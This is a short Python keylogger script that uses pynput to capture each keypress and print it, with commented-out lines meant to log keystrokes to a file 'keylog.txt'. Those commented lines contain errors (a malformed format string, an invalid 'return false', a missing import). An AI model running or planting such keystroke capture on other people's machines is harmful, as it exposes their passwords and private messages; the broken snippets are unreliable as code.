from pynput.keyboard import Listener
import logging

# log_dir = ""

# logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG,
#                     format='%s(asctime)s: %(messages)s:')


def on_press(key):
    print(str(key))
    # if key == Key.esc
    # return false


with Listener(on_press=on_press) as listener:
        listener.join()
